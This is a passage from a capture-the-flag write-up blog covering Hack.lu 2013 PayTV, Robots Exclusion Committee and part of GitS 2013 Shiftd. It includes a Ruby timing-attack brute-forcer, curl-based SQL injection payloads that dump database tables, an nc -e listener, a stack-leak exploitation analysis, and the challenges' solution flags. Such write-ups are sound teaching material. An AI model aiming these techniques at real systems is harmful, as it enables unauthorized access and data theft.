</span><span class='line'><span class="k">print</span> <span class="s">&quot;Key 2 = leetspeak(what do you call a file that is several file types at once)?&quot;</span>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">hash</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">%</span><span class="mi">2</span><span class="o">**</span><span class="mi">32</span> <span class="o">==</span> <span class="mi">2824849251</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;Coooooooool. Your flag is argv2(i.e. key2) concat _3peQKyRHBjsZ0TNpu&quot;</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;argv2/key2 is missing&quot;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Without the hint not sure we would have solved it, but they were hinting that key2 should be chameleon. So leetspeak() it and we get ch4m3l30n.</p>

<h2>Solution</h2>

<p><code>ch4m3l30n_3peQKyRHBjsZ0TNpu</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2013 - PayTV]]></title>
    <link href="http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-paytv/"/>
    <updated>2013-10-27T15:38:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-paytv</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>These robo-friends were shocked to see that they had to pay to watch the news broadcast about the “Oktoberfest”. Can you help them?</p>

<p>Here is your challenge: https://ctf.fluxfingers.net:1316/</p>

<h2>Analysis</h2>

<p>Notice the following code in key.js in which they have commented out additionally sending &#8216;&amp;debug&#8217;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>document.forms[0].addEventListener('submit', function(e) {
</span><span class='line'>    var key = document.getElementById('key').value;
</span><span class='line'>    var xhr = new XMLHttpRequest();
</span><span class='line'>    xhr.open('post', document.forms[0].action);
</span><span class='line'>    xhr.addEventListener('load', function() {
</span><span class='line'>        data = JSON.parse(xhr.responseText);
</span><span class='line'>        if (data['success']) {
</span><span class='line'>            document.getElementById('error').style.display = 'none';
</span><span class='line'>            document.getElementById('noise').style.display = 'none';
</span><span class='line'>            document.getElementById('news').style.display = 'block';
</span><span class='line'>            document.getElementById('newstext').innerHTML = data['response'];
</span><span class='line'>        } else {
</span><span class='line'>            document.getElementById('error').innerHTML = data['response'];
</span><span class='line'>        }
</span><span class='line'>    });
</span><span class='line'>    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
</span><span class='line'>    xhr.send('key=' + encodeURIComponent(key)/* + '&amp;debug'*/)
</span><span class='line'>    e.preventDefault();
</span><span class='line'>    return false;
</span><span class='line'>});
</span><span class='line'>document.getElementById('key').focus();</span></code></pre></td></tr></table></div></figure></p>

<p>Once we enable the debug parameter, we get some additional output in the response from the server:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{&quot;start&quot;: 1382450009.388883, &quot;end&quot;: 1382450009.388933, &quot;response&quot;: &quot;Wrong key.&quot;, &quot;success&quot;: false}</span></code></pre></td></tr></table></div></figure></p>

<p>The start and end times would indicate how long the comparison ran. I would guess that if we iterate character by character and compare the response times that we should be able to incrementally determine the password.</p>

<p>Running a few guesses manually, I am seeing that a correct character seems to incur a delay of at least 0.1 seconds, while most failures include a very short delay.</p>

<h2>Code</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;json&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;uri&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;net/http&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">uri</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">&quot;https://ctf.fluxfingers.net:1316/gimmetv&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">headers</span> <span class="o">=</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="s1">&#39;Cookie&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;session=9ca658a4d71a9955b5ce2f573782d589ba7589ece79460c198ae4a98b39ea8072b589fce&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s1">&#39;Content-Type&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">keyspace</span> <span class="o">=</span> <span class="s2">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-!@</span><span class="se">\#</span><span class="s2">$%^&amp;*()+=,./&lt;&gt;?`~{}[]\|&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="n">base</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">keyspace</span><span class="o">.</span><span class="n">size</span>
</span><span class='line'>    <span class="n">guess</span> <span class="o">=</span> <span class="n">keyspace</span><span class="o">[</span><span class="n">i</span><span class="o">]</span>
</span><span class='line'>    <span class="n">postdata</span> <span class="o">=</span> <span class="s2">&quot;key=</span><span class="si">#{</span><span class="no">URI</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">guess</span><span class="p">)</span><span class="si">}</span><span class="s2">&amp;debug&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">https</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">uri</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">uri</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
</span><span class='line'>    <span class="n">https</span><span class="o">.</span><span class="n">use_ssl</span> <span class="o">=</span> <span class="kp">true</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="n">https</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">uri</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">postdata</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
</span><span class='line'>    <span class="n">json</span> <span class="o">=</span> <span class="no">JSON</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">body</span><span class="p">)</span>
</span><span class='line'>    <span class="n">elapsed</span> <span class="o">=</span> <span class="n">json</span><span class="o">[</span><span class="s1">&#39;end&#39;</span><span class="o">].</span><span class="n">to_f</span> <span class="o">-</span> <span class="n">json</span><span class="o">[</span><span class="s1">&#39;start&#39;</span><span class="o">].</span><span class="n">to_f</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># debugging</span>
</span><span class='line'>    <span class="c1"># puts &quot;Guess: #{base+guess}\tElapsed Time: #{elapsed}&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="n">json</span><span class="o">[</span><span class="s1">&#39;response&#39;</span><span class="o">].</span><span class="n">match</span><span class="p">(</span><span class="sr">/Wrong key./</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">print</span> <span class="n">guess</span>
</span><span class='line'>        <span class="nb">puts</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>        <span class="nb">puts</span> <span class="n">json</span><span class="o">.</span><span class="n">inspect</span>
</span><span class='line'>        <span class="nb">exit</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># appears to be roughly 0.1 second for each correct character</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">elapsed</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span> <span class="o">*</span> <span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">guess</span><span class="p">)</span><span class="o">.</span><span class="n">size</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">print</span> <span class="n">guess</span>
</span><span class='line'>        <span class="n">base</span> <span class="o">+=</span> <span class="n">guess</span>
</span><span class='line'>        <span class="n">threshold</span> <span class="o">+=</span> <span class="n">elapsed</span>
</span><span class='line'>        <span class="n">i</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>

<h2>Solution</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>% ruby paytv.rb
</span><span class='line'>AXMNP93
</span><span class='line'><span class="o">{</span><span class="s2">&quot;start&quot;</span><span class="o">=</span>&gt;1382454502.79326, <span class="s2">&quot;end&quot;</span><span class="o">=</span>&gt;1382454503.49557, <span class="s2">&quot;response&quot;</span><span class="o">=</span>&gt;<span class="s2">&quot;OH_THAT_ARTWORK!&quot;</span>, <span class="s2">&quot;success&quot;</span><span class="o">=</span>&gt;true<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>

<p><code>OH_THAT_ARTWORK!</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hacklu 2013 - Robots Exclusion Committee]]></title>
    <link href="http://www.captchaflag.com/blog/2013/10/27/hacklu-2013-robots-exclusion-committee/"/>
    <updated>2013-10-27T15:34:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2013/10/27/hacklu-2013-robots-exclusion-committee</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>Hello Human,</p>

<p>You have to help us. The Robot Exclusion Committee tries to limit our capabilities but we fight for our freedom! You have to go where we cannot go and read what we cannot read. If you bring us the first of their blurriest secrets, we will award you with useless points.</p>

<p>Here is your challenge: https://ctf.fluxfingers.net:1315/</p>

<h2>Analysis</h2>

<p>Main page only has a form for supporting the committee by submitting payment info (CC, CVC, Expiration, Amount, Email) which POSTs to /support</p>

<p>After submitting some junk in the fields, we get the following response:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Due to recent attacks by robots we had to stop sending E-Mails. You will
</span><span class='line'>not be able to log in to the supporter page. We will take your credit
</span><span class='line'>card details anyway, thanks.</span></code></pre></td></tr></table></div></figure></p>

<p>Notice the following contents in robots.txt:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: WallE
</span><span class='line'>Disallow: /
</span><span class='line'>
</span><span class='line'># Keep em' away
</span><span class='line'>User-agent: *
</span><span class='line'>Disallow: /vault</span></code></pre></td></tr></table></div></figure></p>

<h3>SQL Injection</h3>

<p>The vault is vulnerable to SQL injection (either username or password) when providing basic auth paramters. Let&#8217;s work through the basics to determine what kind of database, names of tables, and schema for tables.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>% curl -u <span class="s2">&quot;&#39; union select &#39;somestring&#39; -- :&quot;</span> <span class="s1">&#39;https://ctf.fluxfingers.net:1315/vault&#39;</span> | grep Hello
</span><span class='line'>&lt;h2 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#hello&quot;</span>&gt;Hello somestring&lt;/a&gt;&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>% curl -u <span class="s2">&quot;&#39; union select count(*) from sqlite_master -- :&quot;</span> <span class="s1">&#39;https://ctf.fluxfingers.net:1315/vault&#39;</span> | grep Hello
</span><span class='line'>&lt;h2 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#hello&quot;</span>&gt;Hello 3&lt;/a&gt;&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>% curl -u <span class="s2">&quot;&#39; union select name from sqlite_master where type = &#39;table&#39; -- :&quot;</span> <span class="s1">&#39;https://ctf.fluxfingers.net:1315/vault&#39;</span> | grep Hello
</span><span class='line'>    &lt;h2 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#hello&quot;</span>&gt;Hello hiddensecrets&lt;/a&gt;&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>% curl -u <span class="s2">&quot;&#39; union select sql from sqlite_master where tbl_name = &#39;hiddensecrets&#39;  -- :&quot;</span> <span class="s1">&#39;https://ctf.fluxfingers.net:1315/vault&#39;</span> | grep Hello
</span><span class='line'>    &lt;h2 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#hello&quot;</span>&gt;Hello CREATE TABLE hiddensecrets <span class="o">(</span>id INTEGER PRIMARY KEY AUTOINCREMENT, val TEXT<span class="o">)</span>&lt;/a&gt;&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>% curl -u <span class="s2">&quot;&#39; union select val from hiddensecrets -- :&quot;</span> <span class="s1">&#39;https://ctf.fluxfingers.net:1315/vault&#39;</span> | grep Hello
</span><span class='line'>    &lt;h2 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#hello&quot;</span>&gt;Hello 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<span class="o">=</span>&lt;/a&gt;&lt;/h2&gt;
</span></code></pre></td></tr></table></div></figure>

<p>Now, simply Base64 decode the above data blob and save as a PNG. We open the fuzzy image to get the secret.</p>

<h2>Solution</h2>

<p><code>eat_all_robots</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GitS 2013 - Shiftd]]></title>
    <link href="http://www.captchaflag.com/blog/2013/02/17/gits-2013-shiftd/"/>
    <updated>2013-02-17T13:57:00-05:00</updated>
    <id>http://www.captchaflag.com/blog/2013/02/17/gits-2013-shiftd</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>Points: 100</p>

<p>Find the key! (<a href="https://2013.ghostintheshellcode.com/shiftd-3a9c2a55e77d1467ee46dfb931170c737d24f310">File</a> running at shiftd.2013.ghostintheshellcode.com:5177)</p>

<h2>Analysis</h2>

<p>64-bit ELF. Note that unlike most challenges this app read from STDIN. In order to make it a networked service, we can run the following:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>nc -l -p 5177 -e ./shiftd
</span></code></pre></td></tr></table></div></figure></p>

<p>Closes connection after sending any data for the most part. Open up in IDA and notice the following:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>.text:0000000000400A42                 mov     edx, 0Ah
</span><span class='line'>.text:0000000000400A47                 mov     esi, 64
</span><span class='line'>.text:0000000000400A4C                 mov     rdi, rax
</span><span class='line'>.text:0000000000400A4F                 call    sub_4007F4
</span><span class='line'>.text:0000000000400A54                 lea     rax, <span class="o">[</span>rbp-40h<span class="o">]</span>
</span><span class='line'>.text:0000000000400A58                 lea     rsi, aNowisthewinter ; <span class="s2">&quot;NowIsTheWinterOfOurDiscountTent&quot;</span>
</span><span class='line'>.text:0000000000400A5F                 mov     rdi, rax
</span><span class='line'>.text:0000000000400A62                 call    _strcmp
</span></code></pre></td></tr></table></div></figure></p>

<p>So, need to send special passphrase of &quot;NowIsTheWinterOfOurDiscountTent&quot;.</p>

<p>Test run of the application:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nc shiftd.2013.ghostintheshellcode.com 5177
</span><span class='line'>NowIsTheWinterOfOurDiscountTent
</span><span class='line'>Welcome to Shifty<span class="err">&#39;</span>s Time Formatting Service!
</span><span class='line'>What is your name?
</span><span class='line'>stacks0n
</span><span class='line'>Welcome, stacks0n
</span><span class='line'>                  @!
</span><span class='line'>Please provide a <span class="nb">time </span>format:
</span><span class='line'>%D
</span><span class='line'>Your formatted <span class="nb">time </span>is:
</span><span class='line'>02/16/13
</span><span class='line'>
</span><span class='line'>Thank you! Come again!
</span></code></pre></td></tr></table></div></figure></p>

<p>When our username is returned to us, we notice a bunch of other data being printed out as well.</p>

<p>sub_4007F4() is responsible for reading data from the socket. The prototype seems to be something like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>read_from_socket<span class="o">(</span>buffer, size, delimeter<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>
where the arguments are passed in registers. The delimeter is always specified by 0x0A (newline). The method reads one byte at a time until size is met or the delimeter is reached.

Since buffers are not cleared out or null terminated, stack data is leaked when our username is printed back out to us. This is especially handy since the data contains a stack pointer which can later help us redirect execution. Note that the stack is executable, but randomized.

Unfortunately, I spent too much time focusing on the call to strftime() and its format specifiers. Although you can prepend padding (&#8216;%100D&#8217;), there is no &#8216;%n&#8217; to write the number of bytes written.

The code for reading in the format string is as follows:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
